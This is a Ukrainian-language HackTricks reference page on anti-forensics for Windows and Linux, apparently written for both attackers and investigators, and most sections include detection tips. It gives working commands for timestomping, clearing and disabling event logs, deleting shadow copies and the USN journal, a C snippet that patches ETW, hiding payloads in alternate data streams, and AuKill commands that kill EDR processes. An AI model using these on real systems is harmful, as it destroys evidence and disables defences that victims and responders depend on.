# Антифорензичні техніки

{{#include ../../banners/hacktricks-training.md}}

## Часові мітки

Зловмисник може захотіти **змінити часові мітки файлів**, щоб уникнути виявлення.\
Часові мітки можна знайти в MFT в атрибутах `$STANDARD_INFORMATION` \_\_ і \_\_ `$FILE_NAME`.

Обидва атрибути містять 4 часові мітки: **зміни**, **доступу**, **створення** та **зміни запису MFT** (MACE або MACB).

**Провідник Windows** та інші інструменти показують інформацію з **`$STANDARD_INFORMATION`**.

### TimeStomp - Антифорензичний інструмент

Цей інструмент **змінює** інформацію про часові мітки в **`$STANDARD_INFORMATION`**, **але** не інформацію в **`$FILE_NAME`**. Тому можна **виявити** **підозрілу** **активність**.

### Usnjrnl

**Журнал USN** (журнал порядкових номерів оновлень) — це функція NTFS (файлової системи Windows NT), що відстежує зміни тома. Інструмент [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) дає змогу досліджувати ці зміни.

![TimeStomp - Антифорензичний інструмент - Usnjrnl: Журнал USN (журнал порядкових номерів оновлень) — це функція NTFS (файлової системи Windows NT), що відстежує зміни тома. ...](<../../images/image (801).png>)

На попередньому зображенні показано **вивід** **інструмента**, у якому видно, що до файла **було внесено деякі зміни**.

### $LogFile

**Усі зміни метаданих файлової системи записуються** у процесі, відомому як [журналювання з випереджальним записом](https://en.wikipedia.org/wiki/Write-ahead_logging). Записані метадані зберігаються у файлі `**$LogFile**`, розташованому в кореневому каталозі файлової системи NTFS. Для аналізу цього файла та виявлення змін можна використовувати такі інструменти, як [LogFileParser](https://github.com/jschicht/LogFileParser).

![Usnjrnl - $LogFile: Усі зміни метаданих файлової системи записуються у процесі, відомому як журналювання з випереджальним записом. Записані метадані зберігаються у файлі $LogFile , розташованому в кореневому...](<../../images/image (137).png>)

Знову ж таки, у виводі інструмента видно, що **було внесено деякі зміни**.

За допомогою того самого інструмента можна визначити, **на який час змінили часові мітки**:

![Usnjrnl - $LogFile: За допомогою того самого інструмента можна визначити, на який час змінили часові мітки](<../../images/image (1089).png>)

- CTIME: час створення файла
- ATIME: час зміни файла
- MTIME: час зміни запису MFT файла
- RTIME: час доступу до файла

### Порівняння `$STANDARD_INFORMATION` і `$FILE_NAME`

Ще один спосіб виявити підозріло змінені файли — порівняти час в обох атрибутах і знайти **невідповідності**.

### Наносекунди

Часові мітки **NTFS** мають **точність** **100 наносекунд**. Тому дуже підозріло, якщо виявлено файли з часовими мітками на кшталт 2010-10-10 10:10:**00.000:0000**.

### SetMace - Антифорензичний інструмент

Цей інструмент може змінювати обидва атрибути `$STARNDAR_INFORMATION` і `$FILE_NAME`. Однак, починаючи з Windows Vista, для зміни цієї інформації потрібна запущена ОС.

## Приховування даних

NFTS використовує кластери й мінімальний розмір інформації. Це означає, що якщо файл займає півтора кластера, **друга половина не використовуватиметься**, доки файл не буде видалено. Тому в цьому slack space можна **приховати дані**.

Існують інструменти, наприклад slacker, які дають змогу приховувати дані в цьому «прихованому» просторі. Однак аналіз `$logfile` і `$usnjrnl` може показати, що було додано дані:

![SetMace - Антифорензичний інструмент - Приховування даних: Існують інструменти, наприклад slacker, які дають змогу приховувати дані в цьому «прихованому» просторі. Однак аналіз $logfile і $usnjrnl може показати, що...](<../../images/image (1060).png>)

Потім slack space можна отримати за допомогою таких інструментів, як FTK Imager. Зверніть увагу, що цей тип інструментів може зберігати вміст в обфускованому або навіть зашифрованому вигляді.

## UsbKill

Цей інструмент **вимикає комп’ютер, якщо виявляє будь-які зміни в USB**-портах.\
Щоб виявити його, можна перевірити запущені процеси та **переглянути кожен запущений скрипт Python**.

## Live Linux-дистрибутиви

Ці дистрибутиви **виконуються в оперативній пам’яті**. Виявити їх можна лише **якщо файлову систему NTFS змонтовано з правами на запис**. Якщо вона змонтована лише з правами на читання, виявити вторгнення неможливо.

## Безпечне видалення

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

### Відкладене самовидалення у Windows

Запущений образ Windows може бути заблокований, доки активний його процес. Процес може передати видалення дочірньому `cmd.exe`, використати `choice` як таймер і завершитися, перш ніж командний рядок виконає `del`. Затримка дає вихідному процесу змогу звільнити дескриптор свого образу; якщо шлях містить пробіли, його потрібно взяти в лапки повністю.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

```cmd
cmd.exe /C choice /C Y /N /D Y /T 6 ^>nul ^& Del /F /Q "<full-path-of-current-executable>"
```

Коли цей рядок передається безпосередньо як аргумент `cmd.exe`, а не вводиться з іншого інтерактивного вікна `cmd`, використовуйте `&` замість `^&` і `>nul` замість `^>nul`. Це видаляє запис каталогу; це **не безпечне стирання** і воно не видаляє сліди виконання, завдань, журналу файлової системи чи інші криміналістичні сліди. Шукайте короткочасні дочірні процеси `cmd.exe`, у командному рядку яких поєднано `choice /T`, `Del` і шлях до образу батьківського процесу.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

## Конфігурація Windows

Можна вимкнути кілька методів журналювання Windows, щоб значно ускладнити криміналістичне розслідування.

### Вимкнення часових міток — UserAssist

Цей розділ реєстру зберігає дати й час запуску кожного виконуваного файла користувачем.

Щоб вимкнути UserAssist, виконайте два кроки:

1. Установіть для обох розділів реєстру `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` і `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` значення нуль, щоб вимкнути UserAssist.
2. Очистьте розділи реєстру, схожі на `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Вимкнення часових міток — Prefetch

Ця функція зберігає дані про запущені програми, щоб підвищити продуктивність системи Windows. Однак ці дані також можуть бути корисними для криміналістичного аналізу.

- Запустіть `regedit`
- Виберіть шлях до файла `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Клацніть правою кнопкою миші `EnablePrefetcher` і `EnableSuperfetch`
- Виберіть для кожного пункт Modify, щоб змінити значення з 1 (або 3) на 0
- Перезавантажте систему

### Вимкнення часових міток — Last Access Time

Щоразу, коли папку відкривають на томі NTFS сервера Windows NT, система оновлює **поле часової мітки для кожної папки у списку** — так званий час останнього доступу. На інтенсивно використовуваному томі NTFS це може впливати на продуктивність.

1. Відкрийте редактор реєстру (Regedit.exe).
2. Перейдіть до `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Знайдіть `NtfsDisableLastAccessUpdate`. Якщо його немає, створіть цей DWORD і встановіть для нього значення 1, щоб вимкнути цей процес.
4. Закрийте редактор реєстру та перезавантажте сервер.

### Видалення історії USB

Усі **записи про USB-пристрої** зберігаються в реєстрі Windows у розділі **USBSTOR**, який містить підрозділи, що створюються щоразу, коли ви підключаєте USB-пристрій до ПК або ноутбука. Цей розділ можна знайти тут: H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Видаливши його**, ви видалите історію USB.\
Також можна скористатися інструментом [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html), щоб переконатися, що записи видалено (і видалити їх).

Ще один файл, у якому зберігається інформація про USB-пристрої, — `setupapi.dev.log` у `C:\Windows\INF`. Його також слід видалити.

### Вимкнення тіньових копій

**Переглянути список** тіньових копій можна командою `vssadmin list shadowstorage`\
**Видалити** їх можна командою `vssadmin delete shadow`

Також можна видалити їх через графічний інтерфейс, виконавши кроки з [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Щоб вимкнути тіньові копії, виконайте [кроки звідси](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Відкрийте програму Services: натисніть кнопку «Пуск» Windows і введіть «services» у поле пошуку.
2. Знайдіть у списку «Volume Shadow Copy», виберіть цю службу, а потім відкрийте Properties, клацнувши правою кнопкою миші.
3. У розкривному списку «Startup type» виберіть Disabled, а потім підтвердьте зміну, натиснувши Apply і OK.

Також можна змінити конфігурацію файлів, які копіюватимуться у тіньову копію, у реєстрі `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Перезапис видалених файлів

- Можна скористатися **інструментом Windows**: `cipher /w:C`. Ця команда вкаже cipher видалити всі дані з доступного невикористаного місця на диску C.
- Також можна скористатися інструментами на кшталт [**Eraser**](https://eraser.heidi.ie)

### Видалення журналів подій Windows

- Windows + R --> eventvwr.msc --> розгорніть «Windows Logs» --> клацніть правою кнопкою миші кожну категорію та виберіть «Clear Log»
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Вимкнення журналів подій Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- У розділі служб вимкніть службу «Windows Event Log»
- `WEvtUtil.exec clear-log` або `WEvtUtil.exe cl`

### Вимкнення $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Розширене журналювання та втручання в сліди (2023-2025)

### Журналювання PowerShell ScriptBlock/Module

У новіших версіях Windows 10/11 і Windows Server зберігаються **детальні криміналістичні артефакти PowerShell** у
`Microsoft-Windows-PowerShell/Operational` (події 4104/4105/4106).  
Зловмисники можуть вимкнути або стерти їх на льоту:

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

Захисникам слід відстежувати зміни цих ключів реєстру та масове видалення подій PowerShell.

### ETW (Event Tracing for Windows) Patch

Продукти безпеки кінцевих точок значною мірою покладаються на ETW. Популярний у 2024 році метод ухилення полягає в тому, щоб пропатчити `ntdll!EtwEventWrite`/`EtwEventWriteFull` у пам’яті, щоб кожен виклик ETW повертав `STATUS_SUCCESS`, не генеруючи подію:<sup>[[5]](#references)</sup>

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Публічні PoC (наприклад, `EtwTiSwallow`) реалізують той самий примітив на PowerShell або C++.  
Оскільки патч діє **лише в межах процесу**, EDR, що працюють в інших процесах, можуть його не помітити.<sup>[[5]](#references)</sup>
Виявлення: порівняйте `ntdll` у пам’яті з його копією на диску або встановіть хук до переходу в user-mode.

### Відродження альтернативних потоків даних (ADS)

У кампаніях з розповсюдження шкідливого ПЗ у 2023 році (наприклад, у завантажувачах **FIN12**) помічали, як бінарні файли другого етапу розміщували в ADS, щоб залишатися непомітними для традиційних сканерів:

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

Перелічіть потоки за допомогою `dir /R`, `Get-Item -Stream *` або Sysinternals `streams64.exe`.
Копіювання файла-хоста на FAT/exFAT або через SMB видалить прихований потік, і це може допомогти
слідчим відновити payload.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver тепер регулярно використовують для **антифорензики** під час вторгнень із ransomware.
Інструмент із відкритим кодом **AuKill** завантажує підписаний, але вразливий драйвер (`procexp152.sys`), щоб
призупинити роботу або завершити процеси EDR і криміналістичних сенсорів **до шифрування та знищення журналів**:<sup>[[1]](#references)</sup>

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

Драйвер згодом видаляється, залишаючи мінімум артефактів.<sup>[[1]](#references)</sup>  
Заходи протидії: увімкніть список блокування вразливих драйверів Microsoft (HVCI/SAC) і налаштуйте сповіщення про створення kernel-service з доступних для запису користувачем шляхів.

---

## Linux Anti-Forensics: самостійне патчення та хмарний C2 (2023–2025)

### Самостійне патчення скомпрометованих сервісів для зниження ймовірності виявлення (Linux)
Зловмисники дедалі частіше «самостійно патчать» сервіс одразу після його експлуатації, щоб запобігти повторній експлуатації та приховати виявлення на основі вразливостей. Ідея полягає в заміні вразливих компонентів найновішими легітимними бінарними файлами/JAR-файлами з upstream, щоб сканери повідомляли, що хост пропатчений, тоді як persistence і C2 залишаються.<sup>[[3]](#references)</sup>

Приклад: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Після експлуатації зловмисники завантажували легітимні JAR-файли з Maven Central (repo1.maven.org), видаляли вразливі JAR-файли з інсталяції ActiveMQ та перезапускали брокер.
- Це усувало початковий RCE, водночас зберігаючи інші точки доступу (cron, зміни конфігурації SSH, окремі C2-імпланти).

Операційний приклад (ілюстративний)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

Поради з форензики та пошуку загроз
- Перевірте каталоги сервісу на незаплановану заміну бінарних файлів/JAR:
  - Debian/Ubuntu: `dpkg -V activemq` і порівняйте хеші/шляхи файлів із дзеркалами репозиторію.
  - RHEL/CentOS: `rpm -Va 'activemq*'`
  - Шукайте версії JAR на диску, які не належать менеджеру пакунків, або символічні посилання, оновлені поза штатним процесом.
- Часова шкала: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort`, щоб зіставити ctime/mtime з періодом компрометації.
- Історія оболонки/телеметрія процесів: свідчення запуску `curl`/`wget` для `repo1.maven.org` або інших CDN артефактів одразу після початкової експлуатації.
- Управління змінами: з’ясуйте, хто і навіщо застосував «патч», а не лише перевіряйте наявність пропатченої версії.

### C2 через хмарні сервіси з bearer-токенами та stager-ами з антианалізом
Зафіксована тактика поєднувала кілька довготривалих каналів C2 та пакування з антианалізом:<sup>[[3]](#references)</sup>
- Захищені паролем ELF-завантажувачі PyInstaller, щоб ускладнити аналіз у пісочниці та статичний аналіз (наприклад, зашифрований PYZ, тимчасове розпакування в `/_MEI*`).
  - Індикатори: збіги `strings`, як-от `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
  - Артефакти під час виконання: розпакування в `/tmp/_MEI*` або користувацькі шляхи `--runtime-tmpdir`.
- C2 через Dropbox із жорстко заданими OAuth Bearer-токенами
  - Мережеві маркери: `api.dropboxapi.com` / `content.dropboxapi.com` із `Authorization: Bearer <token>`.
  - Шукайте в proxy/NetFlow/Zeek/Suricata вихідний HTTPS-трафік до доменів Dropbox із серверних навантажень, які зазвичай не синхронізують файли.
- Паралельний/резервний C2 через тунелювання (наприклад, Cloudflare Tunnel `cloudflared`), щоб зберігати контроль, якщо один канал заблоковано.
  - IOC на хості: процеси/служби `cloudflared`, конфігурація в `~/.cloudflared/*.json`, вихідний трафік на порт 443 до вузлів Cloudflare.

### Persistence і «відкат hardening» для збереження доступу (приклади для Linux)
Зловмисники часто поєднують самостійне виправлення з довготривалими шляхами доступу:<sup>[[3]](#references)</sup>
- Cron/Anacron: зміни заглушки `0anacron` у кожному каталозі `/etc/cron.*/` для періодичного виконання.
  - Пошук:
    ```bash
    for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
    grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
    ```
- Відкат посилення конфігурації SSH: увімкнення входу для root і зміна оболонок за замовчуванням для облікових записів із низькими привілеями.
  - Шукайте ознаки ввімкнення входу для root:
    ```bash
    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
    # flag values like "yes" or overly permissive settings
    ```
  - Шукайте підозрілі інтерактивні оболонки в системних облікових записах (наприклад, `games`):
    ```bash
    awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
    ```
- Випадкові beacon-артефакти з короткими назвами (8 літер), записані на диск і такі, що також зв’язуються з хмарним C2:
  - Пошук:
    ```bash
    find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
      -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
    ```

Захисникам слід зіставляти ці артефакти із зовнішньою доступністю та подіями встановлення виправлень для сервісів, щоб виявляти самостійне усунення слідів після компрометації, спрямоване на приховування початкового експлойту.

## References

- [1] [Sophos X-Ops – AuKill: Озброєний уразливий драйвер для вимкнення EDR (березень 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Патчинг EtwEventWrite для прихованої роботи: виявлення та пошук загроз (червень 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Патчинг для закріплення: як шкідливе ПЗ DripDropper для Linux переміщується в хмарі](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – RCE в Apache ActiveMQ OpenWire (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Приховування вашого .NET — ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [6] [FortiGuard Labs – Виявлення варіанта SectopRAT, вбудованого в легітимне програмне забезпечення](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [7] [Microsoft Learn – команда choice](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/choice)
- [8] [Microsoft Learn – команда del](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
{{#include ../../banners/hacktricks-training.md}}
